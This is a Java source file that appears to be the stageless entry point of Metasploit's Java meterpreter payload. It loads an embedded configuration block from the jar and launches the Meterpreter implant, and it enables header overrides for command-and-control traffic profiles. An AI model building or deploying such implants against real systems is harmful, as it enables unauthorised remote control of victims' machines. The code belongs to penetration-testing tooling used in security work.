package com.metasploit.meterpreter;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;

/**
 * Entry point for stageless Java meterpreter payloads. Reads the embedded
 * TLV config block from a jar resource and hands it to the Meterpreter
 * constructor; transports open their own connections from there.
 */
public class StagelessMain {

    private static final String CONFIG_RESOURCE = "/META-INF/data";

    public static void main(String[] args) throws Exception {
        // Allow MC2 profiles to override restricted HTTP headers (Host,
        // Connection, Content-Length, ...). Must run before any
        // HttpURLConnection is touched so HttpURLConnection's static
        // initializer reads this property.
        System.setProperty("sun.net.http.allowRestrictedHeaders", "true");

        InputStream cfg = StagelessMain.class.getResourceAsStream(CONFIG_RESOURCE);
        if (cfg == null) {
            throw new RuntimeException("no embedded config block");
        }
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        try {
            byte[] chunk = new byte[4096];
            int n;
            while ((n = cfg.read(chunk)) != -1) {
                buf.write(chunk, 0, n);
            }
        } finally {
            cfg.close();
        }
        new Meterpreter(buf.toByteArray(), true, true);
    }
}
